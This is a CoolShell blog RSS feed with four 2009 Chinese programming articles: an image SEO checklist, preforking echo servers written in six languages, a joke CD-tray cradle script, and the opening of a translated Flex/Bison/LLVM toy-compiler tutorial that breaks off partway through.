<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title>酷 壳 – CoolShell</title>
<description>享受编程和技术所带来的快乐 – Coding Your Ambition</description>
<link>https://coolshell.cn</link>
<pubDate>2021-11-25T21:00:59+08:00</pubDate>
<!-- other elements omitted from this example -->
<item>
<title><![CDATA[ 图片搜索引擎优化Checklist ]]></title>
<link>https://coolshell.cn/articles/1528.html</link>
<content><![CDATA[ 
<p style="font-size: 12px; font-family: Arial, Helvetica, sans-serif;">今天，专业的搜索引擎优化SEO（Search Engine Optimizers）会让你的网页或文章能更多得被搜索并访问到。而图片的搜索优化则是这项技术中非常特别的一部分，它可以让你的图片更容易地被人搜索到，比如：艺术图片，服务设计，或是家具等等。相信大家都知道图片远比文字更有吸引力，这是因为我们都知道——“一图胜千言”。</p>
<p style="font-size: 12px; font-family: Arial, Helvetica, sans-serif;"><a href="https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon.jpg"><img alt="image placeholder" ></a></p>
<p>在搜索引擎的世界里，有一组有限的因素决定着图片的位置。下面是一个Checklist可以让你把你的图片搜索优化做得更好。</p>
<p><span id="more-1528"></span></p>
<ul style="list-style-image: url(http://www.webceo.com/newsletter/images/new_s.png); text-align: justify;">
<li>首先，你的图片应该是你的网页的一部分，他们使用了相同的样式。例如：页面的Title，head和Body文本必需和图片一样告诉访问者相同的故事。</li>
<li>在你的服务器上创建一个Images的目录，把你的图片都保存在那里。并且确认搜索引擎可以index这个目录。</li>
<li>在图片的文件名上使用描述性关键字，使用连字符号分隔关键字，千万不要使用下划线。</li>
<li>为图片的HTML中&lt;image&gt;标识中的alt属性提供一个简短的描述，你可以认为这是图片的tag，千万不要在alt属性中放入太多的关键字，就算是这些关键字都是相关的。</li>
<li>可以考虑使用一个短的文本来设置&lt;image&gt;的title属性，其中可以包含关键字。</li>
<li>在图片的周围可以配上详细的说明来描述这个图片。</li>
<li>如果你的图片有链接，那么，其链接文本对于图片搜索的rank是相当有用的。</li>
<li>另一方面，如果你的有其它的页面链接到了某一有重要图片的页面，那么，请创建 keyword-rich 链接文本到这一网页。</li>
<li>尽量使用高分辨率的图片，如果可能的话，提供不同分辨率的图片。</li>
<li>避免在Javascript里设置“点击看大图”的链接，Javascript会让搜索引擎导致难以索引的问题。</li>
<li>检查你图片的缩略图尺寸。缩略图应该到少能让人看清是什么，不然，就算是搜索位置靠前，人们也不会点击。</li>
<li>把照片存成 .JPG 文件，而其它简单的图片则存成 .GIF文件。搜索引擎会试图把GIF文件认为是256色的，而JPG是真彩色的。</li>
<li>经常更新你你的图片，因为这是搜索引擎会经常关临并给高分的依据。</li>
<li>另外，最好在你你的图片上加上水印，这样可以让人们对你的网站增加印象。但水印要恰到好处，不然反而令人生厌。</li>
</ul>
<p>文章：<a href="http://www.webceo.com/newsletter/2009/081009.html" target="_blank">来源</a></p>
<p><script type="text/javascript"></script></p>
 ]]></content>
<pubDate>2009-10-11T11:17:01+08:00</pubDate>
<guid>https://coolshell.cn/articles/1528.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 到处都是Unix的胎记 ]]></title>
<link>https://coolshell.cn/articles/1532.html</link>
<content><![CDATA[ 
<p>一说起Unix编程，不必多说，最著名的系统调用就是fork，pipe，exec，kill或是socket了（<a href="https://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html"><code>fork(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html"><code>execve(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html"><code>pipe(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/socketpair.2.html"><code>socketpair(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html"><code>select(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html"><code>kill(2)</code></a>, <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html"><code>sigaction(2)</code></a>）这些系统调用都像是Unix编程的胎记或签名一样，表明着它来自于Unix。</p>
<p>下面这篇文章，将向大家展示Unix下最经典的socket的编程例子——使用fork + socket来创建一个TCP/IP的服务程序。这个编程模式很简单，首先是创建Socket，然后把其绑定在某个IP和Port上上侦听连接，接下来的一般做法是使用一个fork创建一个client服务进程再加上一个死循环用于处理和client的交互。这个模式是Unix下最经典的Socket编程例子。</p>
<p>下面，让我们看看用C，Ruby，Python，Perl，PHP和Haskell来实现这一例子，你会发现这些例子中的Unix的胎记。如果你想知道这些例子中的技术细节，那么，向你推荐两本经典书——《Unix高级环境编程》和《Unix网络编程》。</p>
<p><span id="more-1532"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#C%E8%AF%AD%E8%A8%80" title="C语言">C语言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Ruby" title="Ruby">Ruby</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Python" title="Python">Python</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Perl" title="Perl">Perl</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#PHP" title="PHP">PHP</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Haskell" title="Haskell">Haskell</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="C%E8%AF%AD%E8%A8%80"></span>C语言<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来看一下经典的C是怎么实现的。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">/**
 * A simple preforking echo server in C.
 *
 * Building:
 *
 * $ gcc -Wall -o echo echo.c
 *
 * Usage:
 *
 * $ ./echo
 *
 *   ~ then in another terminal ... ~
 *
 * $ echo 'Hello, world!' | nc localhost 4242
 *
 */

#include &lt;unistd.h&gt; /* fork, close */
#include &lt;stdlib.h&gt; /* exit */
#include &lt;string.h&gt; /* strlen */
#include &lt;stdio.h&gt; /* perror, fdopen, fgets */
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt; /* waitpid */
#include &lt;netdb.h&gt; /* getaddrinfo */

#define die(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define PORT "4242"
#define NUM_CHILDREN 3

#define MAXLEN 1024

int readline(int fd, char *buf, int maxlen); // forward declaration

int
main(int argc, char** argv)
{
    int i, n, sockfd, clientfd;
    int yes = 1; // used in setsockopt(2)
    struct addrinfo *ai;
    struct sockaddr_in *client;
    socklen_t client_t;
    pid_t cpid; // child pid
    char line[MAXLEN];
    char cpid_s[32];
    char welcome[32];

    /* Create a socket and get its file descriptor -- socket(2) */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
    die("Couldn't create a socket");
    }

    /* Prevents those dreaded "Address already in use" errors */
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;yes, sizeof(int)) == -1) {
    die("Couldn't setsockopt");
    }

    /* Fill the address info struct (host + port) -- getaddrinfo(3) */
    if (getaddrinfo(NULL, PORT, NULL, &amp;ai) != 0) {
    die("Couldn't get address");
    }

    /* Assign address to this socket's fd */
    if (bind(sockfd, ai-&gt;ai_addr, ai-&gt;ai_addrlen) != 0) {
    die("Couldn't bind socket to address");
    }

    /* Free the memory used by our address info struct */
    freeaddrinfo(ai);

    /* Mark this socket as able to accept incoming connections */
    if (listen(sockfd, 10) == -1) {
    die("Couldn't make socket listen");
    }

    /* Fork you some child processes. */
    for (i = 0; i &lt; NUM_CHILDREN; i++) {
    cpid = fork();
    if (cpid == -1) {
        die("Couldn't fork");
    }

    if (cpid == 0) { // We're in the child ...
        for (;;) { // Run forever ...
        /* Necessary initialization for accept(2) */
        client_t = sizeof client;

        /* Blocks! */
        clientfd = accept(sockfd, (struct sockaddr *)&amp;client, &amp;client_t);
        if (clientfd == -1) {
            die("Couldn't accept a connection");
        }

        /* Send a welcome message/prompt */
        bzero(cpid_s, 32);
        bzero(welcome, 32);
        sprintf(cpid_s, "%d", getpid());
        sprintf(welcome, "Child %s echo&gt; ", cpid_s);
        send(clientfd, welcome, strlen(welcome), 0);

        /* Read a line from the client socket ... */
        n = readline(clientfd, line, MAXLEN);
        if (n == -1) {
            die("Couldn't read line from connection");
        }

        /* ... and echo it back */
        send(clientfd, line, n, 0);

        /* Clean up the client socket */
        close(clientfd);
        }
    }
    }

    /* Sit back and wait for all child processes to exit */
    while (waitpid(-1, NULL, 0) &gt; 0);

    /* Close up our socket */
    close(sockfd);

    return 0;
}

/**
 * Simple utility function that reads a line from a file descriptor fd,
 * up to maxlen bytes -- ripped from Unix Network Programming, Stevens.
 */
int
readline(int fd, char *buf, int maxlen)
{
    int n, rc;
    char c;

    for (n = 1; n &lt; maxlen; n++) {
    if ((rc = read(fd, &amp;c, 1)) == 1) {
        *buf++ = c;
        if (c == '\n')
        break;
    } else if (rc == 0) {
        if (n == 1)
        return 0; // EOF, no data read
        else
        break; // EOF, read some data
    } else
        return -1; // error
    }

    *buf = '\0'; // null-terminate
    return n;
}
</pre>
<h4>
<span class="ez-toc-section" id="Ruby"></span>Ruby<span class="ez-toc-section-end"></span>
</h4>
<p>下面是Ruby，你可以看到其中的fork</p>
<pre class="EnlighterJSRAW" data-enlighter-language="ruby"># simple preforking echo server in Ruby
require 'socket'

# Create a socket, bind it to localhost:4242, and start listening.
# Runs once in the parent; all forked children inherit the socket's
# file descriptor.
acceptor = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
address = Socket.pack_sockaddr_in(4242, 'localhost')
acceptor.bind(address)
acceptor.listen(10)

# Close the socket when we exit the parent or any child process. This
# only closes the file descriptor in the calling process, it does not
# take the socket out of the listening state (until the last fd is
# closed).
#
# The trap is guaranteed to happen, and guaranteed to happen only
# once, right before the process exits for any reason (unless
# it's terminated with a SIGKILL).
trap('EXIT') { acceptor.close }

# Fork you some child processes. In the parent, the call to fork
# returns immediately with the pid of the child process; fork never
# returns in the child because we exit at the end of the block.
3.times do
  fork do
    # now we're in the child process; trap (Ctrl-C) interrupts and
    # exit immediately instead of dumping stack to stderr.
    trap('INT') { exit }

    puts "child #$$ accepting on shared socket (localhost:4242)"
    loop {
      # This is where the magic happens. accept(2) blocks until a
      # new connection is ready to be dequeued.
      socket, addr = acceptor.accept
      socket.write "child #$$ echo&gt; "
      socket.flush
      message = socket.gets
      socket.write message
      socket.close
      puts "child #$$ echo'd: '#{message.strip}'"
    }
    exit
  end
end

# Trap (Ctrl-C) interrupts, write a note, and exit immediately
# in parent. This trap is not inherited by the forks because it
# runs after forking has commenced.
trap('INT') { puts "\nbailing" ; exit }

# Sit back and wait for all child processes to exit.
Process.waitall

</pre>
<h4>
<span class="ez-toc-section" id="Python"></span>Python<span class="ez-toc-section-end"></span>
</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="python">"""
Simple preforking echo server in Python.
"""

import os
import sys
import socket

# Create a socket, bind it to localhost:4242, and start
# listening. Runs once in the parent; all forked children
# inherit the socket's file descriptor.
acceptor = socket.socket()
acceptor.bind(('localhost', 4242))
acceptor.listen(10)

# Ryan's Ruby code here traps EXIT and closes the socket. This
# isn't required in Python; the socket will be closed when the
# socket object gets garbage collected.

# Fork you some child processes. In the parent, the call to
# fork returns immediately with the pid of the child process;
# fork never returns in the child because we exit at the end
# of the block.
for i in range(3):
    pid = os.fork()

    # os.fork() returns 0 in the child process and the child's
    # process id in the parent. So if pid == 0 then we're in
    # the child process.
    if pid == 0:
        # now we're in the child process; trap (Ctrl-C)
        # interrupts by catching KeyboardInterrupt) and exit
        # immediately instead of dumping stack to stderr.
        childpid = os.getpid()
        print "Child %s listening on localhost:4242" % childpid
        try:
            while 1:
                # This is where the magic happens. accept(2)
                # blocks until a new connection is ready to be
                # dequeued.
                conn, addr = acceptor.accept()

                # For easier use, turn the socket connection
                # into a file-like object.
                flo = conn.makefile()
                flo.write('Child %s echo&gt; ' % childpid)
                flo.flush()
                message = flo.readline()
                flo.write(message)
                flo.close()
                conn.close()
                print "Child %s echo'd: %r" % \
                          (childpid, message.strip())
        except KeyboardInterrupt:
            sys.exit()

# Sit back and wait for all child processes to exit.
#
# Trap interrupts, write a note, and exit immediately in
# parent. This trap is not inherited by the forks because it
# runs after forking has commenced.
try:
    os.waitpid(-1, 0)
except KeyboardInterrupt:
    print "\nbailing"
    sys.exit()
</pre>
<h4>
<span class="ez-toc-section" id="Perl"></span>Perl<span class="ez-toc-section-end"></span>
</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="perl">#!/usr/bin/perl
use 5.010;
use strict;

# simple preforking echo server in Perl
use Proc::Fork;
use IO::Socket::INET;

sub strip { s/\A\s+//, s/\s+\z// for my @r = @_; @r }

# Create a socket, bind it to localhost:4242, and start listening.
# Runs once in the parent; all forked children inherit the socket's
# file descriptor.
my $acceptor = IO::Socket::INET-&gt;new(
    LocalPort =&gt; 4242,
    Reuse     =&gt; 1,
    Listen    =&gt; 10,
) or die "Couln't start server: $!\n";

# Close the socket when we exit the parent or any child process. This
# only closes the file descriptor in the calling process, it does not
# take the socket out of the listening state (until the last fd is
# closed).
END { $acceptor-&gt;close }

# Fork you some child processes. The code after the run_fork block runs
# in all process, but because the child block ends in an exit call, only
# the parent executes the rest of the program. If a parent block were
# specified here, it would be invoked in the parent only, and passed the
# PID of the child process.
for ( 1 .. 3 ) {
    run_fork { child {
        while (1) {
            my $socket = $acceptor-&gt;accept;
            $socket-&gt;printflush( "child $$ echo&gt; " );
            my $message = $socket-&gt;getline;
            $socket-&gt;print( $message );
            $socket-&gt;close;
            say "child $$ echo'd: '${\strip $message}'";
        }
        exit;
    } }
}

# Trap (Ctrl-C) interrupts, write a note, and exit immediately
# in parent. This trap is not inherited by the forks because it
# runs after forking has commenced.
$SIG{ 'INT' } = sub { print "bailing\n"; exit };

# Sit back and wait for all child processes to exit.
1 while 0 &lt; waitpid -1, 0;
</pre>
<h4>
<span class="ez-toc-section" id="PHP"></span>PHP<span class="ez-toc-section-end"></span>
</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="perl">&lt;?
/*
Simple preforking echo server in PHP.
Russell Beattie (russellbeattie.com)
*/

/* Allow the script to hang around waiting for connections. */
set_time_limit(0);

# Create a socket, bind it to localhost:4242, and start
# listening. Runs once in the parent; all forked children
# inherit the socket's file descriptor.
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($socket,'localhost', 4242);
socket_listen($socket, 10);

pcntl_signal(SIGTERM, 'shutdown');
pcntl_signal(SIGINT, 'shutdown');

function shutdown($signal){
    global $socket;
    socket_close($socket);
    exit();
}
# Fork you some child processes. In the parent, the call to
# fork returns immediately with the pid of the child process;
# fork never returns in the child because we exit at the end
# of the block.
for($x = 1; $x &lt;= 3; $x++){
   
    $pid = pcntl_fork();
   
    # pcntl_fork() returns 0 in the child process and the child's
    # process id in the parent. So if $pid == 0 then we're in
    # the child process.
    if($pid == 0){

        $childpid = posix_getpid();
       
        echo "Child $childpid listening on localhost:4242 \n";

        while(true){
            # This is where the magic happens. accept(2)
            # blocks until a new connection is ready to be
            # dequeued.
            $conn = socket_accept($socket);

            $message = socket_read($conn,1000,PHP_NORMAL_READ);
           
            socket_write($conn, "Child $childpid echo&gt; $message");
       
            socket_close($conn);
       
            echo "Child $childpid echo'd: $message \n";
       
        }

    }
}
#
# Trap interrupts, write a note, and exit immediately in
# parent. This trap is not inherited by the forks because it
# runs after forking has commenced.
try{

    pcntl_waitpid(-1, $status);

} catch (Exception $e) {

    echo "bailing \n";
    exit();

}</pre>
<h4>
<span class="ez-toc-section" id="Haskell"></span>Haskell<span class="ez-toc-section-end"></span>
</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="haskell">import Network
import Prelude hiding ((-))
import Control.Monad
import System.IO
import Control.Applicative
import System.Posix
import System.Exit
import System.Posix.Signals

main :: IO ()
main = with =&lt;&lt; (listenOn - PortNumber 4242) where

  with socket = do
    replicateM 3 - forkProcess work
    wait

    where
    work = do
      installHandler sigINT (Catch trap_int) Nothing
      pid &lt;- show &lt;$&gt; getProcessID
      puts - "child " ++ pid ++ " accepting on shared socket (localhost:4242)"
     
      forever - do
        (h, _, _) &lt;- accept socket

        let write   = hPutStr h
            flush   = hFlush h
            getline = hGetLine h
            close   = hClose h

        write - "child " ++ pid ++ " echo&gt; "
        flush
        message &lt;- getline
        write - message ++ "\n"
        puts - "child " ++ pid ++ " echo'd: '" ++ message ++ "'"
        close

    wait = forever - do
      ( const () &lt;$&gt; getAnyProcessStatus True True  ) `catch` const trap_exit

    trap_int = exitImmediately ExitSuccess

    trap_exit = do
      puts "\nbailing"
      sClose socket
      exitSuccess

    puts = putStrLn

  (-) = ($)
  infixr 0 -

</pre>
<p>如果你知道更多的，请你告诉我们。（全文完）</p>
 ]]></content>
<pubDate>2009-10-11T18:01:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/1532.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 用脚本实现哄小孩睡觉 ]]></title>
<link>https://coolshell.cn/articles/1539.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >当然，不并需要一个天才式的人才能做到这个事，其实这个事情很简单。让我来一点一点向你解释。下面是一些准备工作。</p>
<ul>
<li>首先，你得找一台PC机，得配上光驱，光驱可以破一点。</li>
<li>然后，你得给这台PC机上装上Linux，不需要太多的东西，最基本的就行了。</li>
<li>然后，你得写下下面的代码。</li>
</ul>
<p><span id="more-1539"></span></p>
<p>[bash]<br>
while [1 = 1]<br>
do<br>
#弹出光驱<br>
eject<br>
sleep 1</p>
<p> #收回光驱<br>
eject -t<br>
sleep 1<br>
done<br>
[/bash]</p>
<p>在运行代码之前，请确保你们小孩的摇篮和PC机的光驱连接在一起。当然，你也可以在脚本中播放一曲催眠曲。注意，脚本其中的sleep 1是为了配合上摇篮的节奏，这样需要你在实际过程中调试一下。</p>
<p>这样的成本是不是有点高？居然还要达上一台电脑，呵呵。所以，我就不建议你用Windows来实现了，那样的成本可能会更高。</p>
 ]]></content>
<pubDate>2009-10-12T10:05:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/1539.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 使用Flex Bison 和LLVM编写自己的编译器 ]]></title>
<link>https://coolshell.cn/articles/1547.html</link>
<content><![CDATA[ 
<p><strong>使用Flex Bison 和 LLVM编写你自己的编译器</strong><br>
原文出处：<a href="http://gnuu.org/2009/09/18/writing-your-own-toy-compiler/">http://gnuu.org/2009/09/18/writing-your-own-toy-compiler</a></p>
<h2> 1、介绍</h2>
<p>我总是对编译器和语言非常感兴趣，但是兴趣并不会让你走的更远。大量的编译器的设计概念可以搞的任何一个程序员迷失在这些概念之中。不用说，我也曾今尝试过，但是并没有取得太大的成功，我以前的尝试都停留在语义分析阶段。本文的灵感主要来源于我最近一次的尝试，并且在这一次中我取得一点成就。</p>
<p>幸运的是，最近的几年，我参加了一些项目，这些项目给了我在建立编译器上很多有用的经验和观点。另外一件事是，我非常幸运得到<a href="https://llvm.org/">LLVM</a>的帮助。对于这个工具，我不知道改怎么去形容它，但是他给我的这个编译器的确带来非常大的帮助。<br>
<span id="more-1547"></span></p>
<h3>1.1、你为什么要阅读本文</h3>
<p>你也许想看看我正在做的事情，但是更有可能的是，你也是和我一样对编译器和语言非常感兴趣，并且也可能遇到了一些在探索的过程中遇到了一些难题，你可能正打算解决这些难题，但是却没有发现好的资源。本文的目标就是提供这些资源，并以一种手把手的方式教你从头到尾的去创建一个具有基本功能的语言编译器。</p>
<p>在本文，我不会去解释一些编译器基本理论，所以你要在开始本文前去了解什么是<a href="https://en.wikipedia.org/wiki/Backus%E2%80%93Naur_Form">BNF语法</a>，什么是<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">抽象语法树数据结构 AST data structure</a>，什么是基础<a href="https://en.wikipedia.org/wiki/Compiler">编译器流水线 complier pipline</a>。就是说，我会把本文描述的尽量简单。本文的目的就是以一种简单易懂的方式来介绍相关编译器资源的方式来帮助那些从来没有编译器经验的人。</p>
<h3>1.2、达到的成果</h3>
<p>如果你根据文章内容一步步来，你将会得到一个能定义函数，调用函数，定义变量，给变量赋值执行基本数学操作的语言。这门语言支持两种基本类型，double和integer类型。还有一些功能还未实现，因此，你可以通过自己去实现这些功能得到你满意的功能并且能为你理解编写一个编译器提供不少的帮助。</p>
<p></p>
<h3>1.3 问题解答</h3>

<h4>1.3.1 我需要了解什么样的语言</h4>
<p>我们使用的工具是基于C/C++的。LLVM是基于C++的，我们的这个语言也基于C++，因为C++具有很多面向对象的优点和可以被重用的STL。此外对于C，Lex和Bison都具有那些初看起来令人迷惑的语法，但是我将尽可能的去解释他。我们需要处理的语法非常小，最多就100行，因此它是比较容易理解的。</p>
<h4>1.3.2 很复杂吗？</h4>
<p>是或否，这里面有很多的东西你需要了解，甚至多的让人感觉到害怕，但是老实说，其实这些都非常简单，我们同样会使用很多工具分解这些层次的复杂性，并使得这些内容可管理。</p>
<h4>1.3.3 完成它需要多长时间</h4>
<p>我们将要完成的编译器花了我三天的时间。但是如果你按“follow me”的方式来完成这个编译器的话，你将会花费更少的时间。如果要全部理解这里面的内容可能会花去稍微长一点的时间，但是你至少应该在一个下午就将整个编译器运行起来。</p>
<p>好，如果你已经准备好，我们开始吧。</p>
<p></p>
<h2>2、准备开始</h2>

<h3>2.1 构成编译器的最基本的要素</h3>
<p>一个编译器是由一组有三个到四个组件(还有一些子组件)构成，数据以管道的方式从一个组件输入并流向下一个组件。在我们这个编译器中，可能会用到一些稍微不同的工具。下面这个图展示了我们构造一个编译器的步骤，和每个步骤中将使用的工具。</p>
<p><img alt="image placeholder" > </p>
<p>从上图你可以看到在Linking这一步是灰掉的。我们的语言将不支持编译器的连接(很多的语言都不支持编译器的连接)。在文法分析阶段，我们将使用开源工具Lex，即如今的<a href="http://flex.sourceforge.net/">Flex</a>，文法分析一般都伴随者语法分析，我们使用的语法分析工具将会是Yacc，或者说是<a href="https://www.gnu.org/software/bison/">Bison</a>，最后一旦语义分析完成，我们将遍历我们的抽象语法树，并生成我们的”bytecode 字节码”，或”机器码 matchine code”。做这一步，我们将使用<a href="https://llvm.org/">LLVM</a>，它能生成快速字节码，我们将使用LLVM的JIT(Just In Tinme)来在我们的机器上编译执行它</p>
<p>总结一下，步骤如下：</p>
<ol>
<li>
<strong>文法分析用<em>Flex</em></strong>:将数据分隔成一个个的标记token (标示符identifiers，关键字keywords，数字numbers, 中括号brackets, 大括号braces, 等等etc.) </li>
<li>
<strong>语法分析用<em>Bison</em></strong>: 在分析标记的时候生成抽象语法树. Bison 将会做掉几乎所有的这些工作, 我们定义好我们的抽象语法树就OK了. </li>
<li>
<strong>组装用<em>LLVM</em></strong>: 这里我们将遍历我们的抽象语法树，并未每一个节点生成字节/机器码。 这听起来似乎很疯狂，但是这几乎就是<em>最简单的</em> 一步了. </li>
</ol>
<p>在我们开始下一步之前，你应该准备安装好Flex,Bison和LLVM。因为我们马上就要使用到它们。</p>
<p></p>
<h3>2.2 定义我们的语法</h3>

<p>我们语法是我们语言中最核心的部分，我们的语法使用类似标准C的语法，因为这样的语法非常熟悉，而且简单。我们语法的一个典型的例子如下：<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int do_math(int a) {
  int x = a * 5 + 3
}

do_math(10)
</pre>
<br>
看起来很简单。它和C非常相似，但是它没有使用分号做语句的分隔，同时你也会注意到我们的语法中没有return语句。这就是你可以自己实现的部分。
<p>现在我们还没有任何机制来验证结果。我们将通过检查我们编译之后LLVM打印出的字节码验证我们程序的正确性。</p>
<p></p>
<h2>3、 第一步，使用Flex进行文法分析 </h2>

<p>这是最简单的一步，给定语法之后，我们需要将我们的输入转换一系列内部标记token。如前所述，我们的语法具有非常基础的标记token:标示符identifier ，数字常量(整型和浮点型)，数学运算符号，括号，中括号，我们的文法定义文件称为token.l，它具有一些固定的语法。定义如下：</p>
<pre>%{
#include <string>
#include "node.h"
#include "parser.hpp"
#define SAVE_TOKEN yylval.string = new std::string(yytext, yyleng)
#define TOKEN(t) (yylval.token = t)
extern "C" int yywrap() { }
%}

%%

[ \t\n]                 ;
[a-zA-Z_][a-zA-Z0-9_]*  SAVE_TOKEN; return TIDENTIFIER;
[0-9]+\.[0-9]*          SAVE_TOKEN; return TDOUBLE;
[0-9]+                  SAVE_TOKEN; return TINTEGER;
"="                     return TOKEN(TEQUAL);
"=="                    return TOKEN(TCEQ);
"!="                    return TOKEN(TCNE);
""                     return TOKEN(TCGT);
"&gt;="                    return TOKEN(TCGE);
"("                     return TOKEN(TLPAREN);
")"                     return TOKEN(TRPAREN);
"{"                     return TOKEN(TLBRACE);
"}"                     return TOKEN(TRBRACE);
"."                     return TOKEN(TDOT);
","                     return TOKEN(TCOMMA);
"+"                     return TOKEN(TPLUS);
"-"                     return TOKEN(TMINUS);
"*"                     return TOKEN(TMUL);
"/"                     return TOKEN(TDIV);
.                       printf("Unknown token!\n"); yyterminate();

%%
</string></pre>
<p>在第一节(译者注：即%{%}中定义的部分)声明了一些特定的C代码。由于Bison不会去访问我门的yytext变量，我们使用宏”SAVE_TOKEN”来保证标示符的文本和文本长度是安全的(而不是靠标记本身来保证)。第一个token告诉我们要忽略掉那些空白字符。你会注意到我们有些一些等价性比较的标记和其他。还有一些标记还没有实现，你可以非常自由的将这些标记加到你自己的编译器中去。</p>
<p>现在我们在这里做的是定义这些标记和他们的符号名。符号(比如TIDENTFIER)将成为我们语法中的终结符。我们只是返回它，我们从未定义它，他们是在什么地方定义的？当然是在bison语法文件中。我们包含的parser.hpp头文件将会被bison所生成，并且里面的所有符号都将被生成，并被我们在这里使用。</p>
<p>我们对这个token.l运行flex命令，并生成tokens.cpp文件，这个程序将会和我们的语法分析器一起编译并提供yylex()函数来识别这些标记。我们将在稍后运行这个命令，因为现在我们需要从bison那里生成头文件。</p>
<p></p>
<h2>4、第2步 使用Bison进行语法分析</h2>

<p>这是我们工作中最富有挑战性的一部分。生成一个正确的无二义的语法并不是一项简单的工作，要经过很多实践努力。庆幸的是，我们例子中的语法是简单而完整的。在我们实现我们的语法之前，我们需要详细的讲解一下我们的设计。</p>
<p></p>
<h3>4.1、设计AST(抽象语法树)</h3>

<p>语法分析的最终结果是抽象语法树AST，正如我们将看到的，Bison生成抽象语法树的最优工具；我们唯一需要做的事情就是将我们的代码插入到语法中去。</p>
<p>文本形式字符串，例如”int x”代表了我们语言的文本形式，和这个类似，抽象语法树AST则代表了我们语言在内存中的表现形式一样(在语言在组装成而进程码之前)。正因如此，我们要在把这些插入在语法分析中的数据结构首先设计好。这个过程是非常直接的，因为我们为语法中的每个语义单元创建了一个结构。方法声明、方法调用，变量声明，引用，这些都构成了抽象语法树的节点。我们语言的抽象语法树的节点如下图：<br>
<img alt="image placeholder" ><br>
上图的C++代码如下：<br>
node.h文件<br>
</p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;llvm/Value.h&gt;

class CodeGenContext;
class NStatement;
class NExpression;
class NVariableDeclaration;

typedef std::vector&lt;NStatement*&gt; StatementList;
typedef std::vector&lt;NExpression*&gt; ExpressionList;
typedef std::vector&lt;NVariableDeclaration*&gt; VariableList;

class Node {
public:
    virtual ~Node() {}
    virtual llvm::Value* codeGen(CodeGenContext&amp; context) { }
};

class NExpression : public Node {
};

class NStatement : public Node {
};

class NInteger : public NExpression {
public:
    long long value;
    NInteger(long long value) : value(value) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NDouble : public NExpression {
public:
    double value;
    NDouble(double value) : value(value) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NIdentifier : public NExpression {
public:
    std::string name;
    NIdentifier(const std::string&amp; name) : name(name) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NMethodCall : public NExpression {
public:
    const NIdentifier&amp; id;
    ExpressionList arguments;
    NMethodCall(const NIdentifier&amp; id, ExpressionList&amp; arguments) :
        id(id), arguments(arguments) { }
    NMethodCall(const NIdentifier&amp; id) : id(id) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NBinaryOperator : public NExpression {
public:
    int op;
    NExpression&amp; lhs;
    NExpression&amp; rhs;
    NBinaryOperator(NExpression&amp; lhs, int op, NExpression&amp; rhs) :
        lhs(lhs), rhs(rhs), op(op) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NAssignment : public NExpression {
public:
    NIdentifier&amp; lhs;
    NExpression&amp; rhs;
    NAssignment(NIdentifier&amp; lhs, NExpression&amp; rhs) :
        lhs(lhs), rhs(rhs) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NBlock : public NExpression {
public:
    StatementList statements;
    NBlock() { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NExpressionStatement : public NStatement {
public:
    NExpression&amp; expression;
    NExpressionStatement(NExpression&amp; expression) :
        expression(expression) { }
    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
};

class NVariableDeclaration : public NStatement {
public:
